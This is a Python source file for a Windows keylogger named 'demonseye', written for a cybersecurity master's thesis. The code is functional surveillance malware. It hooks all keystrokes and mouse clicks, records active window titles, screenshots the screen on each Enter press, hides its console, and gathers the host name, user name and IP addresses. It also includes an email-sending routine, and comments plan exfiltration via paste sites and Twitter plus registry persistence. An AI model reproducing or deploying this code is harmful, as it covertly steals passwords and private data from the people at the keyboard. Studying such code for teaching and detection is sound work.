#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#-----------------------------------------------------------------------------------------------------------
# Name:         demonseye.py
# Purpose:      ES - Desarrollo de un keylogger para el TFM del Master en Ciberseguridad de La Salle 2019
#               EN - Development of a keylogger for the TFM of the Master in Cybersecurity of La Salle 2019
#
# Author:       Gabriel Marti
# email:        gabimarti at gmail dot com
# GitHub:       https://github.com/gabimarti
# Created:      19/05/2019
# Copyright:    (c) Gabriel Marti Fuentes 2019
# License:      GPL
#
# Features:     * Record keystrokes
#               * Periodic screen capture
#               * Send data to a remote computer with Monitor App (to do)
#               * Send data to an email account (to do)
#               * Send data to a Twitter account (to do)
#               * Paste data to a Paste service/site (to do)
#
# Required:     Install with "pip install module-name-required"
#               pywin32, pyWinhook, win32gui, requests, wxPython
#
# Notes:        This code has been tested, developed and designed to work in a Windows environment.
#               Its purpose is only educational.
# Updates:
#
#-----------------------------------------------------------------------------------------------------------
#
#
#   to do
#           - auto clone app / copy to windows tmp
#           - install in win registry
#           - send info to paste service
#           - send info to twitter
#           - hide app
#           - command line params: install registry, hide, etc.
#

import atexit
import datetime
import getpass
import glob
import logging
from optparse import OptionParser
import os
import platform
import pythoncom
import pyWinhook as pyHook
import smtplib
import socket
import sys
import tempfile
import threading
import time
import urllib.request
import win32console
import win32gui
import wx

########################################################
# CONSTANTES
########################################################
DEBUG = 1
CRLF = '\n'                 # salto de linea
KLGPRE = 'klg_'             # prefijo nombre ficheros de log
KLGEXT = '.pkl'             # extension nombre ficheros keylogger
KEYCODE_EXIT = 7            # CTRL + G > combinación especial para cerrar keylogger


########################################################
# VARIABLES GLOBALES
########################################################

# contador de teclas presionadas
key_counter = 0

# control evento anterior
old_event = None

# buffer de caracteres. hasta que no se llena, no se graba en el fichero en disco
# de esta manera se evitan escrituras contínuas a disco por cada tecla pulsada
# cuando de supera el limite de key_max_chars se graba el buffer a disco
key_max_chars = 25
key_buffer = ''

# control de tamaño de archivo (en bytes) que activa que se envie a almacenamiento remoto
# cuando el tamaño del fichero de keylog supera este tamaño entoces se envia el fichero
# seguidamente se borra y se crea un nuevo fichero de keylog
file_size_trigger = 4096

# ruta y nombre archivo keylog. se asigna el nombre en la función create_keylog_file()
keylog_name = ''


# to do
#   - system disk info
#   - memory info

# control de threads
threadLock = threading.Lock()
threadList = []


########################################################
# CLASES
########################################################

# Clase con metodo que toma captura de pantalla y despues la envia
class ScreenShootThread (threading.Thread):
   def __init__(self, screen_filename):
      threading.Thread.__init__(self)
      self.screen_file = screen_filename
   def run(self):
      print("Guardado captura " + self.screen_file)
      app = wx.App()  # Need to create an App instance before doing anything
      screen = wx.ScreenDC()
      size_x, size_y = screen.GetSize()
      bmp = wx.EmptyBitmap(size_x, size_y, -1)
      mem = wx.MemoryDC(bmp)
      mem.Blit(0, 0, size_x, size_y, screen, 0, 0)
      del mem  # libera memoria que contiene captura de imagen
      del app  # libera objeto de instancia de la aplicación
      bmp.SaveFile(self.screen_file, wx.BITMAP_TYPE_PNG)
      print("Fin captura " + self.screen_file)



########################################################
# FUNCIONES
########################################################

'''
Control parametros linea de comando, para instalar, configurar, ajustar.
NO IMPLEMENTADO TODAVIA
'''
def parse_params():
    usage = "Uso: %prog [options] arg1 arg2"
    parser = OptionParser(usage=usage)
    parser.add_option("-v", "--verbose",
                      action="store_true", dest="verbose", default=True,
                      help="make lots of noise [default]")
    parser.add_option("-q", "--quiet",
                      action="store_false", dest="verbose",
                      help="be vewwy quiet (I'm hunting wabbits)")
    parser.add_option("-f", "--filename",
                      metavar="FILE", help="write output to FILE")
    parser.add_option("-m", "--mode",
                      default="intermediate",
                      help="interaction mode: novice, intermediate, "
                           "or expert [default: %default]")
    return



# función que hace "paste" del contenido del fichero de keylog
# https://pastecode.xyz/api
# https://pastecode.xyz/api/create
#       text=[your paste text]
#       title=[title]
#       name=[name]
#       private=1
#       lang=[language] -> lang=text
#       expire=[minutes]
#
def paste_file():

    return paste_id



# función de envio de información por email (solo para depuración)
def send_email(message):
    try:
        # Datos
        email_from_addr = '***@gmail.com'
        email_to_addrs = '***@gmail.com'
        email_username = '***@gmail.com'
        email_password = '****'

        # Enviando el correo
        server = smtplib.SMTP('smtp.gmail.com:587')
        server.starttls()
        server.login(email_username, email_password)
        server.sendmail(email_from_addr, email_to_addrs, message)
        server.quit()

    except:
        logging.debug('No he podido enviar mensaje')
        pass


# oculta ventana de aplicación
def hide_console():
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window,0)
    return True


# obtiene la ip externa
def get_external_ip():
    return urllib.request.urlopen('https://ident.me').read().decode('utf8')


# añade información inicial de información al fichero de keylog
def register_system_info():
    global key_buffer

    key_buffer += '[SYSTEM INFO BEGIN]' + CRLF
    key_buffer += 'cpu=' + cpu + CRLF
    key_buffer += 'os=' + operating_system + CRLF
    key_buffer += 'hostname=' + hostname + CRLF
    key_buffer += 'username=' + username + CRLF
    key_buffer += 'localip=' + localip + CRLF
    key_buffer += 'externalip=' + externalip + CRLF
    key_buffer += 'executable=' + execname + CRLF
    key_buffer += 'extension=' + extension + CRLF
    key_buffer += 'drive=' + driveunit + CRLF
    key_buffer += 'selfpathandfilename=' + keylog_name + CRLF
    key_buffer += 'datetime=' + datetime.datetime.now().strftime("%Y-%m-%d %H:%M") + CRLF
    key_buffer += '[SYSTEM INFO END]' + CRLF + CRLF
    return True


# guarda el nombre de la ventana activa y lo añade al fichero de log de teclas
def register_window_name(text):
    global key_buffer
    key_buffer += CRLF + CRLF + '[WINDOW NAME] ' + text + CRLF
    logging.debug('Window Name '+text)
    return True


# registra una captura de pantalla, añade el nombre al fichero de keylog
# y seguidamente inicia un thread para su grabación en disco
# y envio al servicio externo
def capture_screen():
    global key_buffer
    screen_file = 'scr' + datetime.datetime.now().strftime("%y%m%d%H%M") + '.png'
    key_buffer += CRLF + CRLF + '[SCREENSHOT] ' + screen_file + CRLF
    pantalla = ScreenShootThread(screen_file)
    pantalla.start()
    return


# ejecuta las acciones necesarias para enviar el fichero de keylog
# a los diferentes recursos o servicios que se hayan definido
def send_keylog_file():
    global keylog_name

    '''
	Aqui envia el fichero al servidor  o servicios configurados
	Hacer un 'paste' en un servidor
	Publicar un tweet en cuenta privada con la url del paste
	Opcionalmente hace envio por email para pruebas
    '''

    return True


# borra todos los ficheros temporales del keylog
def delete_keylog_tempfile(pattern = None):
    if pattern == None:                     # si no se recibe nombre de fichero por defecto borra todos los ficheros de keylog
        pattern = KLGPRE+"*"+KLGEXT

    folder_files = tempfile.gettempdir() + "\\" + pattern
    for file_remove in glob.glob(folder_files):
        logging.debug('Borrando fichero temporal: ' + file_remove)
        os.remove(file_remove)

    return


# crea fichero de keylog
def create_keylog_file():
    global keylog_name, key_buffer

    # crea fichero de keylog en la carpeta temporal del usuario
    prefix = KLGPRE + datetime.datetime.now().strftime("%y%m%d%H%M")
    ftemp, keylog_name = tempfile.mkstemp(KLGEXT, prefix)
    logging.debug('Creaf fichero keylogger ' + keylog_name)
    f = open(keylog_name, 'w+')
    f.close()

    key_buffer = ''                         # nos aseguramos de tener el buffer vacio
    register_system_info()                  # guardamos información general del sistema
    return True


# funcion que vacia el buffer del teclado sobre el fichero de disco
def flush_key_buffer_to_disk():
    global key_buffer, keylog_name

    # añade buffer a ficher de disco
    f = open(keylog_name, 'a')
    f.write(key_buffer)
    f.close()

    # vacia buffer de teclado
    key_buffer = ''
    return True


# en caso de teclas especiales, retorna True para las que queramos que queden registradas
# o False para las que no deseemos que queden registradas.
# si no encuentra la tecla en la lista, retorna True por defecto
# para poder registrar teclas desconocidas hasta el momento
def save_special_control_key(event):
    switcher = {
        'TAB': True,
        'LSHIFT': False,
        'RSHIFT': False,
        'CAPITAL': True,
        'LCONTROL': True,
        'RCONTROL': True,
        'LMENU': True,
        'RMENU': True,
        'LWIN': False,
        'RETURN': True
    }
    return switcher.get(event.Key.upper(), True)


# añade tecla al buffer y si este esta lleno se vacia al disco
def add_key_to_buffer(event):
    global key_buffer, key_max_chars, key_counter
    key = event.Ascii

    # asigna tecla. si es una tecla especial asigna string definiendo tipo de tecla
    # si se desea mostrar el espacio como [SPACE] se debe de indicar (key < 33)
    # en la condicion inferior, sino se mostrara un espacio en blanco tal cual.
    if (key < 32) or (key > 126):
        if save_special_control_key(event):
            ckey = '[' + event.Key.upper() + ']'
            if ckey == '[ENTER]' or ckey == '[RETURN]':
                ckey += CRLF
                capture_screen()                # cada vez que se pulsa RETURN hace captura de pantalla
        else:
            ckey = ''
    else:
        ckey = chr(key)

    key_buffer += ckey

    # incrementa contador de teclas (de momento sin uso definido)
    if len(ckey) > 0:
        key_counter += 1

    # si buffer esta lleno lo vacia y envia el fichero en caso de ser necesario
    if len(key_buffer) > key_max_chars:
        flush_key_buffer_to_disk()
        send_keylog_file()

    return True


# control eventos de ratón
# no se registran eventos de raton excepto los cambios de ventana
def on_mouse_event(event):
    global old_event

    # si cambia ventana la registra
    if (old_event == None or event.WindowName != old_event.WindowName) and event.WindowName != None:
        register_window_name(repr(event.WindowName))

    old_event = event

    return True


# control eventos de teclado
def on_keyboard_event(event):
    global key_buffer, key_counter, old_event

    # debug code
    logging.debug('Time: ' + repr(event.Time))
    logging.debug('MessageName: ' + repr(event.MessageName) +' Message: ' + repr(event.Message))
    logging.debug('Window: ' + repr(event.Window) + ' WindowName: ' + event.WindowName)
    logging.debug('Ascii: ' + repr(event.Ascii) + repr(chr(event.Ascii)))
    logging.debug('Key: ' + repr(event.Key) + ' KeyID: ' + repr(event.KeyID))
    logging.debug('ScanCode: ' + repr(event.ScanCode) + ' Extended: ' + repr(event.Extended))
    logging.debug('Injected: ' + repr(event.Injected) + ' Alt: ' + repr(event.Alt))
    logging.debug('Transition: ' + repr(event.Transition))

    # presiona CTRL+E para salir y desactivar el KeyLogger
    if event.Ascii == KEYCODE_EXIT:
        msg = 'Cerrando aplicación por combinación especial de tecla ' + repr(event.Ascii)
        logging.debug(msg)
        key_buffer += CRLF + CRLF + "[" + msg + "]" + CRLF
        sys.exit(0)

    # si cambia entana la registra
    if (old_event == None or event.WindowName != old_event.WindowName) and event.WindowName != None:
        register_window_name(repr(event.WindowName))

    # guarda caracter en el buffer
    add_key_to_buffer(event)

    # guarda evento actual para comparar con el siguiente
    # y poder controlar si se mantienen pulsadas teclas especiales
    # o saber si se cambia de ventana
    old_event = event

    return True

# función que ejecutará al cerrar el programa
def on_close_program():
    global key_buffer, threadList

    # registra en fichero de log el cerrado del programa con fecha y hora
    key_buffer += CRLF + CRLF
    key_buffer += '[CLOSING PROGRAM]' + CRLF
    key_buffer += 'datetime=' + datetime.datetime.now().strftime("%Y-%m-%d %H:%M") + CRLF
    # se asegura de vaciar buffer
    flush_key_buffer_to_disk()
    # envia ultimo fichero de log de teclas
    send_keylog_file()
    # ejecuta captura de pantalla
    capture_screen()

    # borra ficheros temporales

    # espera que finalicen todos los threads que pueda haber activos
    for thr in threadList:
        thr.join()

    return


########################################################
# MAIN
########################################################

# establece log de depuración
logging.basicConfig(filename='pkLogger.log',filemode='w',level=logging.DEBUG, format='%(asctime)s - %(levelname)s : %(message)s')

# inicializa variables con información del sistema y el usuario
cpu = platform.processor()
operating_system = platform.platform()
hostname = socket.gethostname()
username = getpass.getuser()
localip = socket.gethostbyname(hostname)
externalip = get_external_ip()
execname = sys.argv[0]                              # modo alternativo > execname = os.path.realpath(__file__)
extension = os.path.splitext(__file__)[1]
driveunit = os.path.splitdrive(__file__)[0]

# parsea parametros recibidos
parse_params()

# oculta ventana de aplicación
hide_console()

# borra todos los archivos de keylog antiguos (si existen)
delete_keylog_tempfile()

# crea el archivo que registra las teclas
create_keylog_file()

# crea el objeto hook manager
hm = pyHook.HookManager()

# registras callbacks de control de eventos
hm.MouseAllButtonsDown = on_mouse_event
hm.KeyDown = on_keyboard_event

# establece el hook de eventos de ratón y teclado
hm.HookMouse()
hm.HookKeyboard()

# registra handler de la función que se ejecutará al terminar la aplicación
atexit.register(on_close_program)

# espera indefinidamente hasta que se produce combinación de salida del keylogger
pythoncom.PumpMessages()
